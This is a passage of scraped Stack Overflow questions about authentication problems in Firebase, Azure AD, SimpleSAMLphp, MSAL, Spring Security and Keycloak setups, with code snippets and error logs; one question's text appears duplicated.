          debugPrint(&quot;Trying to pop-up microsoft login&quot;);
          UserCredential cred;
          if (kIsWeb) {
            debugPrint(&quot;On the web&quot;);
            FirebaseAuth.instance.signOut();
            cred = await FirebaseAuth.instance.signInWithPopup(provider);
            debugPrint(cred.user?.displayName);
            debugPrint(cred.user?.email);
          } else {
            debugPrint(&quot;Not on web&quot;);
            try {
              // TODO implement normal sign in without microsoft
              // given a username &amp; password, send info and authenticate                               // firebase with microsoft login info. If possible w/ popup
              // cred = await FirebaseAuth.instance.whateverMethodGetsLoginAtMicroSoft
            } on FirebaseAuthException catch (e) {
              errorMessage = &quot;${e.code} - ${e.message}&quot;;
              debugPrint(errorMessage);
            }
          }
        } on FirebaseAuthException catch (e) {
          errorMessage = &quot;${e.code} - ${e.message}&quot;;
          debugPrint(errorMessage);
        }
      }
</code></pre>
"
"<p>Here for some guidence.</p>
<p>I have a simple php App that users create accounts via email and password. This works well. The app is a service for schools in the UK.</p>
<p>I've considering implementing SSO for Office 365 (possible google schools at a later date too) to my php application using SimpleSamlPHP. However, I have no experience of this at all. If someone good provide a step by step of what is expected/needed, that would be amazing (but any imput would be greatly apppraciated). Here is what I have researched so far. Please correct me if this is wrong...I found it very hard to find current php examples...</p>
<p>1.a. School/schools would need register a New App in Azure AD (my app).</p>
<p>1.b. Provide the school/tenant with domain name urls and redirect urls for the app registration</p>
<ol start=""2"">
<li><p>Install Simplesamlphp on my serverI'm here for some guidance.
I have a simple PHP app that lets users create accounts via email and password. This works well. The app is a service for schools in the UK.
I'm considering implementing SSO for Office 365 (possible Google Schools at a later date too) in my PHP application using SimpleSamlPHP. However, I have no experience with this at all. If someone could provide a step-by-step explanation of what is expected or needed, that would be amazing, but any input would be greatly appreciated. Here is what I have researched so far. Please correct me if this is wrong. I found it very hard to find current PHP examples.
1.a. Schools would need to register a new app in Azure AD (my app).
1.b. Provide the school/tenant with domain name urls and redirect urls for the app registration.</p>
</li>
<li><p>Install Simplesamlphp on my server.</p>
</li>
<li><p>Configure Simplesamlphp with the credentials from the school's New App Registration (not sure about this step). Particularly with a multi-tenant approach</p>
</li>
<li><p>Then test.
Other considerations...
Do I need to get my code or app verified with MS as an approved app? This would prevent warning messages to the user, as it would be an approved app with MS. I think this would help with step 1.
Each collection of users (tenants) is from a school. There will be many schools that require access to the app too.
Would SSO via SimpleSamlphp be a good choice?
Any advice or reference articles would be greatly appreciated.
I'm in the early stages of researching this. But I have access to a personal Office 365 account for testing.</p>
</li>
<li><p>Configure Simplesamlphp with the credentials from the schools New App Registration (No sure about this step). Particulally with a mulit-tenant approach</p>
</li>
<li><p>Then Test.</p>
</li>
</ol>
<p>Other considerations...</p>
<p>Do I need to get my code/app verified with MS as an approved app? This would prevent warning messages to the user as it would be an approved app with MS. I think this would help with step 1.</p>
<p>Each collection of users (tenants) are from a school. There will be many school's requiring accces to the app too.</p>
<p>Would SSO via SimpleSamlphp be a good chooice?</p>
<p>Any advice or reference articles would be greatly appreciated.</p>
<p>I'm in the early stages of researching this. But have access to a personal office 365 account for testing.</p>
"
"<p>We are trying to implement Role based Authentication for our Multitenant application which allows home tenant users and External tenant users as well.</p>
<p>Application is hosted on One tenant of Azure Platform. We have roles 2 roles for Home tenant users. The two roles are &quot;Admin.Only&quot; and &quot;User.Only&quot;. For the external users we are assigning role as &quot;External.Only&quot;.</p>
<p>Our front end application is in Angular and backend API is in .Net core.</p>
<p>We are using MSAL library for Application Authentication.</p>
<p>Currently we have assigned one role to home tenant user email id and assigned Another role to external user. We have invited external user (Added as Guest User) and external user accepted the invitation as well.</p>
<p>Now, if we login with Home tenant email Id, we are getting role in the JWT token. But we are not getting role in JWT for external users.</p>
<p>We have assigned the role to user directly from the Enterprise application page. Also I have created an Azure group and added external user (Guest user). But role is not coming up in JWT. I even tried with Security groups too but roles is not showing up in JWT.</p>
<p><strong>Can anyone help here to get the Role in JWT when external user is logged in? So that we can validate the JWT token at the .Net Core API controller level to Authorize their role and serve the API responses accordingly.</strong></p>
"
"<p>I'm trying to set up firebase auth using the firebaseui module in a vue.js app. I'm not completely sure how to set up the firebase imports and implement firebaseui in the vue.js environment.
I've created a separate firebaseInit.js in the src folder:</p>
<pre><code>import { initializeApp } from &quot;firebase/app&quot;
import { getFunctions, connectFunctionsEmulator } from &quot;firebase/functions&quot;;
import { getFirestore, collection } from &quot;firebase/firestore&quot;;
import { getAuth } from &quot;firebase/auth&quot;;

const firebaseConfig = {
    apiKey: &quot;...&quot;
};

// Initialize Firebase
export const firebaseApp = initializeApp(firebaseConfig);

const db = getFirestore();
// here we can export reusable database references
export const todosRef = collection(db, 'todos')

const functions = getFunctions();
connectFunctionsEmulator(functions, &quot;127.0.0.1&quot;, 5001);

// Initialize Firebase Authentication and get a reference to the service
export const firebaseAuth = getAuth(firebaseApp);
</code></pre>
<p>Then in main.js:</p>
<pre><code>import { createApp } from 'vue'
import App from './App.vue'
import router from './router'
import './index.css'
import './firebaseInit'

const app = createApp(App)
app.use(router)
app.mount('#app')
</code></pre>
<p>And finally in the script portion of the view.vue:</p>
<pre><code>import { getFirestore, collection, addDoc, doc, getDoc, getDocs, query, where } from &quot;firebase/firestore&quot;;
import * as firebaseui from 'firebaseui'
import 'firebaseui/dist/firebaseui.css';
import { firebaseAuth } from '@/firebaseInit';
import { firebaseApp } from '@/firebaseInit';

// Initialize the FirebaseUI Widget using Firebase.
var ui = new firebaseui.auth.AuthUI(firebaseAuth);

ui.start('#firebaseui-auth-container', {
  signInOptions: [
    firebaseApp.auth.EmailAuthProvider.PROVIDER_ID
  ],
  // Other config options...
});
</code></pre>
<p>I'm getting the following error:</p>
<blockquote>
<p>Uncaught TypeError: Cannot read properties of undefined (reading 'EmailAuthProvider')</p>
</blockquote>
<p>The Firebase documentation actually has the following code for implementing the UI (<a href=""https://firebase.google.com/docs/auth/web/firebaseui"" rel=""nofollow noreferrer"">https://firebase.google.com/docs/auth/web/firebaseui</a>):</p>
<pre><code>var firebase = require('firebase');
var firebaseui = require('firebaseui');

// Initialize the FirebaseUI Widget using Firebase.
var ui = new firebaseui.auth.AuthUI(firebase.auth());
ui.start('#firebaseui-auth-container', {
  signInOptions: [
    firebase.auth.EmailAuthProvider.PROVIDER_ID
  ],
  // Other config options...
});
</code></pre>
<p>But since I'm using the vite bundler I'm not importing 'firebase' with the require function.</p>
"
"<p>My goal is to use the msgraph api via logic apps to query a shared mailbox and return the result for a keyword in the subject line.</p>
<p><a href=""https://i.stack.imgur.com/DeD3X.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/DeD3X.png"" alt=""enter image description here"" /></a></p>
<p>Above is what i currently have written.</p>
<p>I would like to know if this query is correct.</p>
<p>What is the least privileged role i can give to an auth app registration or managed identity to achieve this task. ideally i dont want to give this app reg / identity permission to read anything other than the mailbox specified.</p>
<p>verify query:</p>
<pre><code>https://graph.microsoft.com/v1.0/users/@{items('For_each_5')}/messages?$filter=from/emailAddress/address eq 'sharedmailbox@example.com.au' and toRecipients/any(r:r/emailAddress/address eq '@{items('For_each_5')}') and contains(subject, 'keyword')&amp;$select=subject,from,toRecipients,receivedDateTime,bodyPreview
</code></pre>
"
"<p>I've been looking for the cause of this problem and I've already tested several ways that I saw here on Stack Overflow, but nothing seems to solve the problem.</p>
<p>Basically, I'm trying to authenticate through Google, and when I get to the Google account selection page and it returns to my activity, I always see a result of RESULT_CANCELED (0) instead of RESULT_OK (-1), regardless of the account selected. .</p>
<p>I checked that the credentials are configured correctly in the Google Console and that the SHA-1 caves (debug and release) were added correctly. I even deleted my firebase project and created a new one following the step by step instructions but nothing helped.</p>
<p>My call for authentication:</p>
<pre><code> GoogleSignInOptions googleSignInOptions = new                GoogleSignInOptions.Builder(GoogleSignInOptions.DEFAULT_SIGN_IN)
            .requestIdToken(getString(R.string.client_id_google))
            .requestEmail()
            .build();

    googleSignInClient = GoogleSignIn.getClient(LoginActivity.this, googleSignInOptions);
    firebaseAuth = FirebaseAuth.getInstance(); 
</code></pre>
<p>And the ActivityResultLauncher that expects the result:</p>
<pre><code>mStartForResult = registerForActivityResult(new ActivityResultContracts.StartActivityForResult(),
            result -&gt; {
                if (result.getResultCode() == Activity.RESULT_OK) {
                    getInformationSignedAccountGoogle(result.getData());
                }
            });
</code></pre>
"
"<p>I'm currently working on implementing user authentication with Firebase in my iOS app. I've encountered a puzzling issue in my <code>AuthViewModel</code> where I'm importing Firebase but still getting errors like:</p>
<pre class=""lang-swift prettyprint-override""><code>Cannot find type 'FirebaseAuth' in scope
</code></pre>
<p>The perplexing part is that despite these errors, my app builds successfully without any issues when run on the simulator.</p>
<p>Has anyone faced a similar situation, and could you shed some light on why these errors are occurring even when the app builds without any apparent problems during simulation? Any insights or suggestions would be greatly appreciated. Thank you!</p>
<p>I just am on the page and this appears, but disappears once program is ran.</p>
"
"<p>I've got two functions (let's call them A and B) in an Azure function app (environment: Python); both are HTTP triggered function. Function A calls function B to receive a token from an external 3rd party API endpoint. Microsoft authentication is turned on for the function app. So, function A calls B with Microsoft client credentials. The function app is developed in VScode and deployed through the Azure plugin in the cloud.
This is where function A gets stuck, waiting for a response from B. But B never executes. I've tried the following:</p>
<ul>
<li>Call B from a local notebook with the same client credentials while B is deployed. Works as intended; B sends out token from the cloud.</li>
<li>Execute function A locally, calling B from cloud. Works as intended; B sends out token from the cloud.</li>
<li>Trigger function B from browser. works as intended; B sends out a token that I can see from the browser.</li>
</ul>
<p>Its only when A executes in cloud when it can't get a response from B and times out.</p>
<p>The client credential script I'm using:</p>
<pre><code># Dedicated Graph Access App
client_secret = 'secret'
client_id = 'client_id'

token_url = 'https://login.microsoftonline.com/&lt;tenant_id&gt;/v2.0/token?'
token_data = {&quot;client_id&quot;:client_id,
            &quot;client_secret&quot;:client_secret,
            &quot;scope&quot;:&quot;&lt;client_id&gt;/.default&quot;,
            &quot;grant_type&quot;:&quot;client_credentials&quot;
            }
token_r = requests.post(token_url, data=token_data)
token = token_r.json().get('access_token')

headers = {
    'Authorization':&quot;Bearer &quot;+token,
    'ConsistencyLevel':'eventual'
}
</code></pre>
<p>Function B is called via:</p>
<pre><code>accessTokenUrl = &quot;https://appname.azurewebsites.net/api/functionName?code=&lt;function_code&gt;&quot;
access_token = requests.get(accessTokenUrl, headers = headers).content.decode()
</code></pre>
<p>Which works when I call function B from local notebook. I know function A gets stuck waiting for B to respond because I've checked logs for B, it never executes as if never got triggered by A. And I've put some debugging messages in A which lets me know that A got up to B execution and then it timed out.</p>
<p>I'm at a complete loss of why this happens. Is there a specific way to call one function from another function in Azure apps? Why can't A get response from B when B executes fine by itself?</p>
<p>I've tried the following:</p>
<ul>
<li>Call B from a local notebook with the same client credentials while B is deployed. Works as intended; B sends out token from the cloud.</li>
<li>Execute function A locally, calling B from cloud. Works as intended; B sends out token from the cloud.</li>
<li>Trigger function B from browser. works as intended; B sends out a token that I can see from the browser.</li>
</ul>
"
"<p>I am using firebase to authenticate users on my site. I use the firebase client sdk to get idtokens in the frontend and then I send them to the backend on every api call to be verifed with the firebase admin sdk. I have a service account set up in my firebase console but recently due to a security concern, I removed the firebase service account and created a new one. I deleted all of the service accounts first from my firebase project and then attempted to refresh a page or access anything that would call my api. For some reason, my tokens were still verified, allegedly using my now deleted firebase service account (that should not exist anymore). I tried this a number of times but I don't understand. The service account is not there, therefore, the verification of the idtoken should fail in some way. What am I missing?</p>
<p><strong>frontend</strong></p>
<pre class=""lang-js prettyprint-override""><code>export async function firebaseLoginGooglePopup(route) {
    let provider = new GoogleAuthProvider();
    let auth = getAuth();
    return signInWithPopup(auth, provider)
    .then( async (userCredential) =&gt; {
        let token = userCredential._tokenResponse.idToken;
        // store in session, send to backend on each api call
    }).catch((error) =&gt; {
        const errorCode = error.code;
        if(errorCode == 'auth/operation-not-allowed')
            console.log('Auth not linked for user');
        else 
            console.log('Failed to login!');
    });
}
</code></pre>
<p><strong>backend</strong></p>
<pre class=""lang-js prettyprint-override""><code>const admin = require('firebase-admin'); // for service account
const { getAuth } = require(&quot;firebase-admin/auth&quot;); // for token decoding
const express = require('express');
const router = express.Router();

//Loaded from environment variables
const serviceAccount = {
    type: firebasetype,
    project_id: firebaseprojectID,
    private_key_id: firebaseprivatekeyID,
    private_key: firebaseprivatekey?.replace(/\\n/g, '\n'),
    client_email: firebaseclientemail,
    client_id: firebaseclientID,
    auth_uri: firebaseauthuri,
    token_uri: firebasetokenuri,
    auth_provider_x509_cert_url: firebaseauthprovidercert,
    client_x509_cert_url: firebaseclientcerturl
  };
  
  admin.initializeApp({
    credential: admin.credential.cert(serviceAccount)
  });

  console.log('Firebase should be connected');


// Grab token from header and verify it using admin sdk
const isAuthenticated = (req, res, next) =&gt; {
    const token = req.headers['authorization'] ? req.headers['authorization'].split(&quot; &quot;) : null;
    if(!token){
        console.log('No header provided');
        res.status(403).json('Forbidden');
    }
    else if(!token[1]){
        console.log('No token detected');
        res.status(403).json('Forbidden');
    }
    else
    {
        let auth = getAuth();
        auth.verifyIdToken(token[1])
        .then((decodedToken) =&gt; {
            console.log(&quot;Server: auth token verified&quot;);
            next();
        })
        .catch((error) =&gt; {
            console.log(error);
            res.status(401).json({ error: 'Auth expired!'});
        });
    }
}
</code></pre>
<p>Express uses isAuthenticated on every api call before proceeding to get anything else. The token is there accordingly and looks accurate based on checks with the client sdk. If it fails at the verification in the backend it should send a 401. I know the token and the environment variables for a new service account are accurate (console logged and checked so I know I'm using a new service account). I don't get it though. If the service account doesn't exist, how could this possibly still verify the token?</p>
<p>Also, while on the IAM page after I deleted my service account I noticed a principal &quot;firebase-service-account@firebase-sa-management.iam.gserviceaccount.com&quot; showed up. I assume this is a default that gets created automatically?</p>
"
"<p>I have a dotnet 6.0 worker service running on Windows Server 2022 Standard.</p>
<p>In order to authenticate with Azure I am using <code>DefaultAzureCredential</code> and <a href=""https://serverfault.com/questions/813506/setting-environment-variable-for-service"">have set Environmental variables against the appropriate registry key</a> for the tenant, client, and client secret as per <a href=""https://learn.microsoft.com/en-us/dotnet/api/azure.identity.environmentcredential?view=azure-dotnet"" rel=""nofollow noreferrer"">https://learn.microsoft.com/en-us/dotnet/api/azure.identity.environmentcredential?view=azure-dotnet</a>.</p>
<p>When connecting to Azure I get the error: &quot;EnvironmentCredential authentication unavailable. Environment variables are not fully configured.&quot;</p>
<p>Upon further debugging I can see that the values for <code>AZURE_CLIENT_ID</code> and <code>AZURE_CLIENT_SECRET</code> are correctly set and available to the service.</p>
<p>The problem is that <code>AZURE_TENANT_ID</code> is not set.  It can be seen in regedit, and the value is correct.</p>
<p>I added a log of</p>
<pre><code>var tid = Environment.GetEnvironmentVariable(&quot;AZURE_TENANT_ID&quot;) ?? &quot;*missing*&quot;; 
</code></pre>
<p>this returned <code>*missing*</code>, doing the same for the other variables returns the expected value.</p>
<p>I am using the exact same code in a net48 app and this works as expected. The environment variables are set using PowerShell via Octopus deploy in both cases.</p>
<p>I have done the usual checks for things like typos or smart quotes.  I have also added a leading dummy key in case it was a problem with the 1st value.</p>
<p>For now I can work around this with <code>Environment.SetEnvironmentVariable(&quot;AZURE_TENANT_ID&quot;,&quot;foo&quot;);</code> but I would like this to work as intended with out the work around.</p>
"
"<p><a href=""https://i.stack.imgur.com/Vl7Tq.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/Vl7Tq.png"" alt=""enter image description here"" /></a></p>
<p><strong>Error Message</strong>:</p>
<pre><code>The portal is having issues getting an authentication token. The experience rendered may be degraded.

Additional information from the call to get a token:
Extension: Microsoft_Azure_Monitoring
Resource: loganalyticsapi
Details: The extension 'Microsoft_Azure_Monitoring' has not defined the resource access 
for resource 'loganalyticsapi' in the extension's configuration, or in the portal's configuration.
</code></pre>
<p>When I create the resource in Azure, the access is not showing in the IAM of that resource and also getting authentication issue.</p>
<p>I'm the owner of my subscription.</p>
<h3>Updated:</h3>
<p><a href=""https://i.stack.imgur.com/pJVCr.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/pJVCr.png"" alt=""enter image description here"" /></a></p>
<p>I'm getting the same issue - no role assignments after any resource creation in Azure Portal.</p>
<p>I'm the Owner of My Azure Free Subscription.</p>
<p>Could anyone help me!</p>
"
"<p>I want to have two failures URLs based on authentication problem (one when credentials are wrong and second when account isn't activated yet). So I have implemented my own AuthenticationProvider and AuthenticationFailureHandler. The problem now is to get redirected to these urls you first need to fail authentication and then get authenticated correctly.
In more details:</p>
<ol>
<li>You enter main page (<code>localhost:8080</code>) but because it requires you to be authenticated you get redirected to <code>localhost:8080/login</code></li>
<li>You enter wrong credentials</li>
<li>You should be redirected to <code>localhost:8080/login?badCredentials</code> bad instead you get redirected to the same page (<code>localhost:8080/login</code>)</li>
<li>You enter good credentials</li>
<li>You get redirected to <code>localhost:8080/login?badCredentials&amp;continue</code>, so it is combined failure url with default succesful url?, though you Authentication object is stored in SecurityContext and you got logged in.</li>
<li>Though when you now enter wrong credentials or login with not activated account you got redirected correctly so the problem is only the first redirection I think?</li>
<li>You manually enter <code>localhost:8080</code> (main page) and you are logged in.</li>
</ol>
<p>I have even created a <a href=""https://streamable.com/w1s47o"" rel=""nofollow noreferrer"">video</a> which demonstrates how it works now</p>
<p>AuthenticationProvider</p>
<pre class=""lang-java prettyprint-override""><code>@Component
public class AuthenticationProviderImpl implements AuthenticationProvider {

    private final UserDetailsService userDetailsService;
    private final PasswordEncoder passwordEncoder;

    @Autowired
    public AuthenticationProviderImpl(UserDetailsService userDetailsService, PasswordEncoder passwordEncoder) {
        this.userDetailsService = userDetailsService;
        this.passwordEncoder = passwordEncoder;
    }

    @Override
    public Authentication authenticate(Authentication authentication) throws AuthenticationException {
        try {
            String passwordEnteredByUser = authentication.getCredentials().toString();
            UserDetails userDetails = userDetailsService.loadUserByUsername(authentication.getName());

            if (!passwordEncoder.matches(passwordEnteredByUser, userDetails.getPassword())) {
                throw new BadCredentialsException(&quot;Bad credentials&quot;);
            }

            if (!userDetails.isEnabled()) {
                throw new AccountNotActivatedException(&quot;Account not activated&quot;);
            }

            return new UsernamePasswordAuthenticationToken(
                    userDetails.getUsername(),
                    userDetails.getPassword(),
                    userDetails.getAuthorities()
            );
        } catch (UsernameNotFoundException e) {
            throw new BadCredentialsException(&quot;Bad credentials&quot;);
        }
    }

    @Override
    public boolean supports(Class&lt;?&gt; authentication) {
        return UsernamePasswordAuthenticationToken.class.isAssignableFrom(authentication);
    }
}
</code></pre>
<p>AuthenticationFailureHandler</p>
<pre class=""lang-java prettyprint-override""><code>@Setter
@Component
public class AuthenticationFailureHandlerImpl implements AuthenticationFailureHandler {

    private String redirectUrl = &quot;login?error&quot;;
    private final RedirectStrategy redirectStrategy = new DefaultRedirectStrategy();

    @Override
    public void onAuthenticationFailure(HttpServletRequest request, HttpServletResponse response,
                                        AuthenticationException exception) throws IOException {

        if (exception instanceof BadCredentialsException) {
            setRedirectUrl(&quot;login?badCredentials&quot;);
        } else if (exception instanceof AccountNotActivatedException) {
            setRedirectUrl(&quot;login?notActivated&quot;);
        }

        this.redirectStrategy.sendRedirect(request, response, redirectUrl);
    }
}
</code></pre>
<p>SecurityConfig</p>
<pre class=""lang-java prettyprint-override""><code>@Configuration
public class SecurityConfig {

    private final AuthenticationFailureHandler authenticationFailureHandler;
    private final AuthenticationProvider authenticationProvider;

    @Autowired
    public SecurityConfig(AuthenticationProvider authenticationProvider,
                          AuthenticationFailureHandler authenticationFailureHandler) {
        this.authenticationProvider = authenticationProvider;
        this.authenticationFailureHandler = authenticationFailureHandler;
    }

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity httpSecurity) throws Exception {
        return httpSecurity
                .authorizeHttpRequests(authorize -&gt; authorize
                        .requestMatchers(&quot;/register&quot;).permitAll()
                        .anyRequest().authenticated()
                )
                .formLogin(form -&gt; form
                        .permitAll()
                        .loginPage(&quot;/login&quot;)
                        .defaultSuccessUrl(&quot;/&quot;)
                        .failureHandler(authenticationFailureHandler)

                )
                .logout(logout -&gt; logout
                        .logoutUrl(&quot;/logout&quot;)
                )
                .authenticationProvider(authenticationProvider)
                .build();
    }

    @Bean
    public static PasswordEncoder passwordEncoder() {
        return new BCryptPasswordEncoder();
    }
}
</code></pre>
<p>EDIT: Looks like the problem was that /login also required to be authenticated. Adding this one line <code>requestMatchers(&quot;/login&quot;).permitAll()</code> fix this, though I kinda don't understand how was it able to display correctly when user wasn't authenticated?</p>
"
"<p>I'm using Spring Boot, Spring Security, Thymeleaf, Websockets.</p>
<p>I have the following dependencies in pom.xml:</p>
<pre><code>        &lt;dependency&gt;
            &lt;groupId&gt;org.webjars&lt;/groupId&gt;
            &lt;artifactId&gt;webjars-locator-core&lt;/artifactId&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.webjars&lt;/groupId&gt;
            &lt;artifactId&gt;sockjs-client&lt;/artifactId&gt;
            &lt;version&gt;1.0.2&lt;/version&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.webjars&lt;/groupId&gt;
            &lt;artifactId&gt;stomp-websocket&lt;/artifactId&gt;
            &lt;version&gt;2.3.3&lt;/version&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.webjars&lt;/groupId&gt;
            &lt;artifactId&gt;bootstrap&lt;/artifactId&gt;
            &lt;version&gt;3.3.7&lt;/version&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.webjars&lt;/groupId&gt;
            &lt;artifactId&gt;jquery&lt;/artifactId&gt;
            &lt;version&gt;3.1.1-1&lt;/version&gt;
        &lt;/dependency&gt;
</code></pre>
<p>In an html file, I have the following references:</p>
<pre><code>  &lt;link href=&quot;/webjars/bootstrap/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
  &lt;script src=&quot;/webjars/jquery/jquery.min.js&quot;&gt;&lt;/script&gt;
  &lt;script src=&quot;/webjars/sockjs-client/sockjs.min.js&quot;&gt;&lt;/script&gt;
  &lt;script src=&quot;/webjars/stomp-websocket/stomp.min.js&quot;&gt;&lt;/script&gt;
</code></pre>
<p>I have also tried placing the jars in the same directory as the html file like this:</p>
<pre><code>&lt;link href=&quot;bootstrap.min.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot;&gt;
&lt;script src=&quot;jquery.min.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;sockjs.min.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;stomp.min.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;
&lt;script src=&quot;script.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;
</code></pre>
<p>My SecurityFilterChain:</p>
<pre><code>@Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {

        http.csrf().disable().authorizeHttpRequests()


                .requestMatchers(&quot;/register&quot;).permitAll()
                .requestMatchers(&quot;/websocket&quot;).permitAll()
                .requestMatchers(&quot;/home&quot;).permitAll().and()
                .formLogin()
                .loginPage(&quot;/login&quot;)
                .loginProcessingUrl(&quot;/login&quot;)
                .defaultSuccessUrl(&quot;/websocket&quot;, true).permitAll()
                .and()
                .logout()
                .invalidateHttpSession(true)
                .clearAuthentication(true)
                .logoutRequestMatcher(new AntPathRequestMatcher(&quot;/logout&quot;))
                .logoutSuccessUrl(&quot;/login?logout&quot;).permitAll();

        return http.build();
    }
</code></pre>
<p>When the html page tries to load, I keep getting the following errors (which are found in the browser's console):</p>
<pre><code>The resource from “http://localhost:8080/bootstrap.min.css” was blocked due to MIME type (“”) mismatch (X-Content-Type-Options: nosniff).
websocket
The resource from “http://localhost:8080/jquery.min.js” was blocked due to MIME type (“”) mismatch (X-Content-Type-Options: nosniff).
websocket
The resource from “http://localhost:8080/sockjs.min.js” was blocked due to MIME type (“”) mismatch (X-Content-Type-Options: nosniff).
websocket
The resource from “http://localhost:8080/script.js” was blocked due to MIME type (“”) mismatch (X-Content-Type-Options: nosniff).
websocket
The resource from “http://localhost:8080/stomp.min.js” was blocked due to MIME type (“”) mismatch (X-Content-Type-Options: nosniff).
websocket
Loading failed for the &lt;script&gt; with source “http://localhost:8080/jquery.min.js”. websocket:7:56
Loading failed for the &lt;script&gt; with source “http://localhost:8080/sockjs.min.js”. websocket:8:56
Loading failed for the &lt;script&gt; with source “http://localhost:8080/stomp.min.js”. websocket:9:55
The resource from “http://localhost:8080/script.js” was blocked due to MIME type (“”) mismatch (X-Content-Type-Options: nosniff).
websocket
Loading failed for the &lt;script&gt; with source “http://localhost:8080/script.js”.
</code></pre>
<p>I have spent hours trying to figure out what to do to get around this.  I would really appreciate it if someone can shed some light on this issue!</p>
<p>Thanks</p>
"
"<p>I have decoded Jwt token like that. I added User Realm Role Token Mapper in Client Scope using Keyclock server. Thus we can access that claim directly from jwt.</p>
<pre><code>{
  &quot;exp&quot;: 1707597391,
  &quot;iat&quot;: 1707597091,
  &quot;jti&quot;: &quot;505e8da0-1035-49fc-be74-1c59ab15ac03&quot;,
  &quot;iss&quot;: &quot;http://localhost:8181/realms/spring-boot-microservices-realm&quot;,
  &quot;aud&quot;: &quot;account&quot;,
  &quot;sub&quot;: &quot;bcb69d29-b6a4-4c74-96f5-4e89e3f741a1&quot;,
  &quot;typ&quot;: &quot;Bearer&quot;,
  &quot;azp&quot;: &quot;spring-cloud-client&quot;,
  &quot;session_state&quot;: &quot;f36ff533-9403-4b15-9099-d1679e4afd13&quot;,
  &quot;acr&quot;: &quot;1&quot;,
  &quot;allowed-origins&quot;: [
    &quot;/*&quot;
  ],
  &quot;realm_access&quot;: {
    &quot;roles&quot;: [
      &quot;offline_access&quot;,
      &quot;ADMIN&quot;,
      &quot;uma_authorization&quot;,
      &quot;default-roles-spring-boot-microservices-realm&quot;
    ]
  },
  &quot;resource_access&quot;: {
    &quot;account&quot;: {
      &quot;roles&quot;: [
        &quot;manage-account&quot;,
        &quot;manage-account-links&quot;,
        &quot;view-profile&quot;
      ]
    }
  },
  &quot;scope&quot;: &quot;email profile&quot;,
  &quot;sid&quot;: &quot;f36ff533-9403-4b15-9099-d1679e4afd13&quot;,
  &quot;email_verified&quot;: false,
  &quot;roles&quot;: [
    &quot;offline_access&quot;,
    &quot;ADMIN&quot;,
    &quot;uma_authorization&quot;,
    &quot;default-roles-spring-boot-microservices-realm&quot;
  ],
  &quot;preferred_username&quot;: &quot;admin&quot;
}

</code></pre>
<p>Thats here my Security Config file</p>
<pre><code>
@Configuration
@EnableWebFluxSecurity
public class SecurityConfig {


    @Bean
    public SecurityWebFilterChain securityFilterChain(ServerHttpSecurity http) throws Exception{
        http
        .authorizeExchange(exchange -&gt; exchange
                .pathMatchers(&quot;/api/product/**&quot;).permitAll()
                .pathMatchers(&quot;/api/user/**&quot;).hasRole(&quot;ADMIN&quot;)
                .anyExchange().authenticated())
                .oauth2ResourceServer((oauth2) -&gt; oauth2
                .jwt(Customizer.withDefaults()));

        return http.build();
    }



    @Bean
    public JwtAuthenticationConverter con(){
        JwtAuthenticationConverter c = new JwtAuthenticationConverter();
        JwtGrantedAuthoritiesConverter cv = new JwtGrantedAuthoritiesConverter();
        cv.setAuthorityPrefix(&quot;&quot;); // Default &quot;SCOPE_&quot;
        cv.setAuthoritiesClaimName(&quot;roles&quot;); //Default &quot;scope&quot; or &quot;scp&quot;
        c.setJwtGrantedAuthoritiesConverter(cv);
        return c;
    }


}
</code></pre>
<p>I can obtain roles on my Jwt token and i use JwtAuthenticationConverter however still i can not access role based path it throws me 403 Forbidden exception. I didn't understands what is the problem exactly.</p>
"
"<p>I want to continue an old android project of mine and started fixing issues with that. My program launches well in android virtual device but then goes background.(I tried it on my phone it doesn't do that) Then checked logcats and saw erros like below</p>
<pre><code>java.lang.NoClassDefFoundError: Failed resolution of: Lcom/google/android/gms/auth/api/credentials/CredentialsOptions$Builder;
    at com.firebase.ui.auth.util.GoogleApiUtils.getCredentialsClient(GoogleApiUtils.java:29)
    at com.firebase.ui.auth.viewmodel.AuthViewModelBase.onCreate(AuthViewModelBase.java:30)
    at com.firebase.ui.auth.viewmodel.ViewModelBase.init(ViewModelBase.java:24)
    at com.firebase.ui.auth.KickoffActivity.onCreate(KickoffActivity.java:38)
    at android.app.Activity.performCreate(Activity.java:8595)
    at android.app.Activity.performCreate(Activity.java:8573)
    at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1456)
    at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:3764)
    at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:3922)
    at android.app.servertransaction.LaunchActivityItem.execute(LaunchActivityItem.java:103)
    at android.app.servertransaction.TransactionExecutor.executeCallbacks(TransactionExecutor.java:139)
</code></pre>
<p>App has facebook,google and mail login check at start and it is giving errors there as far as i understand.
Here is the deprecated code i have below;</p>
<pre><code>@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    providers = new ArrayList&lt;&gt;();
    setContentView(R.layout.activity_main);
    auth = FirebaseAuth.getInstance();
    if(auth.getCurrentUser() != null){
        //USER ALREADY SIGNED IN
        Log.d(&quot;AUTH&quot;, auth.getCurrentUser().getEmail());
        String firebaseuser = auth.getCurrentUser().getDisplayName();
        String uid = auth.getCurrentUser().getUid();
        Log.i(&quot;myuserid: &quot;, uid);
        Intent intent = new Intent(getApplicationContext(),MainActivity.class);
        intent.putExtra(&quot;firebaseuser&quot;, firebaseuser);
        intent.putExtra(&quot;firebaseuid&quot;, uid);
        startActivity(intent);
    }else{
        Log.d(&quot;AUTH222&quot;,&quot;burada&quot;);
        startActivityForResult(AuthUI.getInstance()
                        .createSignInIntentBuilder()
                        .setAvailableProviders(Arrays.asList(
